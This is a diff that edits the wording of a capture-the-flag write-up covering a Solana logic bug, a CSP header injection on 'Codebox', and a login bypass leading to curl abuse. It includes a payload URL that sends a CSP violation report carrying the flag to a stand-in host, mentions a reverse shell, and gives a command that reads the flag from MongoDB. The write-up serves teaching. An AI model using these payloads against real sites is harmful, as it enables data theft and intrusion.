@@ -242,11 +242,11 @@ fn main() -> Result<(), Box<dyn Error>> {
 
 ### Baby Solana:
 
-After analyzing the server code, you can see that we need to make `state.x` and `state.y` to be both `0` after the server finishes running our transaction. Those values are initialized to `1000000` and `1000001` at program start. The only function we are given that can directly modify those values is the `swap` function.
+After analyzing the server code, you can see that we need to make `state.x` and `state.y` to be both 0 after the server finishes running our transaction. Those values are initialized to `1000000` and `1000001` at program start. The only function we are given that can directly modify those values is the `swap` function.
 
 The `swap` function does not actually swap any values, it simply increases `state.x` and `state.y` according to the `amt` argument that is passed-in by the user, and then increases by `state.fee * state.x / 100` and `state.fee * state.y / 100` respectively.
 
-Since there is no check on the sign of the `amt` parameter, there exists a logic bug that allows an attacker to supply a negative `amt` and make `state.x` completely `0`. Then, we can set the `state.fee` to be `-100`. This will make `state.y` from `1` to `0`
+Since there is no check on the sign of the `amt` parameter, there exists a logic bug that allows an attacker to supply a negative `amt` and negative `state.fee`. First, we can set the `state.fee` to be `-100`, and then pass in `amt` of `-1000000` This will make both `state.x` and `state.y` to `0` 
 
 exp:
 
@@ -564,7 +564,7 @@ The contents of the `tests` array are the same as the test cases displayed on th
 
 ### Codebox:
 
-The backend of this question extracts the img tags from req.query.code, and adds their src to the CSP header, here you can inject a semicolon, that is, append any CSP
+The backend code extracts the img tags from `req.query.code`, and adds their `src` attributs to the CSP header. Here you can inject a semicolon. In other words, you can append any CSP directive.
 
 ```javascript
     const csp = [
@@ -601,11 +601,29 @@ The code for setting the flag on the front end is as follows:
 </script>
 ```
 
-The flag is directly written into the DOM through innerHTML. If `require-trusted-types-for 'script'` is specified in the CSP header, the assignment of the innerHTML will violate the CSP rules because the string has not been processed by Trusted-Types.
+The code for setting the flag on the front end is as follows:
 
-Violations of CSP rules can be reported to the specified address through report-uri or report-to, and the reported content will contain a small number of error details.
+```html
+<script>
+    const code = new URL(window.location.href).searchParams.get('code');
+    if (code) {
+        const frame = document.createElement('iframe');
+        frame.srcdoc = code;
+        frame.sandbox = '';
+        frame.width = '100%';
+        document.getElementById('content').appendChild(frame);
+        document.getElementById('code').value = code; 
+    }
 
-Construct the following payload and access:
+    const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
+    document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
+</script>
+```
+
+The flag is directly written into the DOM through innerHTML. If `require-trusted-types-for 'script'` is specified in the CSP header, the assignment of the innerHTML will violate the CSP directive because the string has not been processed by Trusted-Types.
+
+Violations of CSP rules can be reported to a specified URL through `report-uri` or `report-to` CSP directive, and the content reported will contain some of the details.
+Let's build the following payload:
 
 ```
 https://codebox.mc.ax/?code=<img+src="111%3brequire-trusted-types-for+'script'%3breport-uri+http://csp.example.com%3b">
@@ -613,15 +631,15 @@ https://codebox.mc.ax/?code=<img+src="111%3brequire-trusted-types-for+'script'%3
 
 ![](https://imgur.com/BPsIPrg.png)
 
-It can be found that require-trusted-types-for is indeed violated and report-uri is triggered to send the error to example.com, but the error occurs in the setting of iframe srcdoc in if (code), which leads to the code that sets the flag later and not implemented. How can we avoid violating CSP in iframe srcdoc? The answer is not to enter this code inside if(code), and look at the code source:
+It's noticed that `require-trusted-types-for` is indeed violated and `report-uri` is triggered to send the error to example.com, but the error occurs in the setting of iframe srcdoc in `if (code)`, while the code that sets the flag later is not processed due to the error occurring in the same context earlier. How to avoid violating CSP in setting iframe srcdoc? The answer is not to enter `if(code)`. Let's take a look at where the `code` comes from:
 
 ```
 const code = new URL(window.location.href).searchParams.get('code');
 ```
 
-The front-end `code` is obtained through the browser's URL class searchParams.get(). This method takes the first one when there are multiple identical parameters. When the backend fetches `req.query.code`, express.js fetches the last one.
+In the front-end, `code` is extracted using the browser's `URL` class searchParams.get(). This method returns the first one when there are multiple identical parameters. While when the backend express.js fetches `req.query.code`, it reads the last one.
 
-So you can construct `?code=&code=<real_payload>` to let the front end and the front end get what they need. While the front end bypasses the if(code) branch, the CSP response header can also be injected into the back end, and finally the innerHTML that sets the flag is violated. CSP triggers an error and gets the flag:
+So we can construct `?code=&code=<real_payload>` to let the frontend and backend get what they need separately. While the frontend bypasses the `if(code)` branch to set flag through innerHTML, at the backend the CSP response header can also be injected, and finally the `innerHTML` that sets the flag is violated, and CSP triggers an error and thus we can get the flag:
 
 ![](https://imgur.com/UVCXHw3.png)
 
@@ -634,9 +652,9 @@ app.post("/api/login", async (req, res) => { //...
 app.post("/api/ping", requiresLogin, (req, res) => { // ..
 ```
 
-The first is to log in, and the second is to spawn a curl and some parameters are controllable. So it seems that the first step in this question should be to bypass the login.
+The first one is login function, and the second one is to spawn a `curl` with some controllable parameters. So it seems that the first step in this challenge is to bypass login.
 
-The second route has the requiresLogin middleware, but its implementation has a big flaw: the res.redirect() line is missing the return
+The second route has the `requiresLogin` middleware, but there is definitely a flow in its implementation: `return` is missing in the `res.redirect()` line:
 
 ```javascript
 const requiresLogin = (req, res, next) => {
@@ -647,7 +665,7 @@ const requiresLogin = (req, res, next) => {
 };
 ```
 
-That is to say, even if you are not logged in, next() will actually be executed, but you cannot see the actual content returned by the subsequent routes. This is very similar to using `header('Location: /redirect-to-xxx')`; in php; there is no exit() or die() after the jump, so the following code is still executed.
+That is to say, even if we are not logged in, the `next()` will actually be executed, but we cannot see the content returned by the subsequent routes. This primitive is very similar to using `header('Location: /redirect-to-xxx');` in php, where there is no exit() or die() after the redirection, so the code thereafter still gets executed.
 
 Let's take a look at the key parts of /api/ping:
 
@@ -671,7 +689,7 @@ Let's take a look at the key parts of /api/ping:
     });
 ```
 
-Here will take three contents from req.body, url, opt and data. Where url is verified by `new URL(url)` and the protocol must be http or https; opt has a regular check and must be `-` followed by a letter; when opt is -d or data is one of GET/POST, they will be passed as parameters to curl. The parameter passed here is child_process.spawn, and shell=True is not specified in the third parameter, so `cmd` or `$(cmd)` cannot be injected into the parameter to execute the command.
+The code extracts 3 params from req.body: `url`, `opt` and `data`. Where `url` is verified by new `URL(url)` and the protocol must be either http or https; `opt` has a RegEx check and must be - followed by a letter; when `opt` is `-d` or `data` is one of GET/POST, they will be passed as parameters to curl. The parameters are passed to child_process.spawn, and `shell=True` is not specified in the third parameter, so `cmd` or `$(cmd)` cannot be injected into the parameter to execute the command.
 
 That is to say, the commands we can execute look like this:
 
@@ -739,7 +757,6 @@ After RCE rebounds the shell, connect to mongodb to read the flag according to t
 ```
 node -e '(async _ =>{const { MongoClient } = require("mongodb"); const client = new MongoClient("mongodb://mongodb:27017/"); q = await client.db("secret").collection("flag").find().toArray(); console.log(q);})()'
 ```
-
 
 ### jwtjail:
 
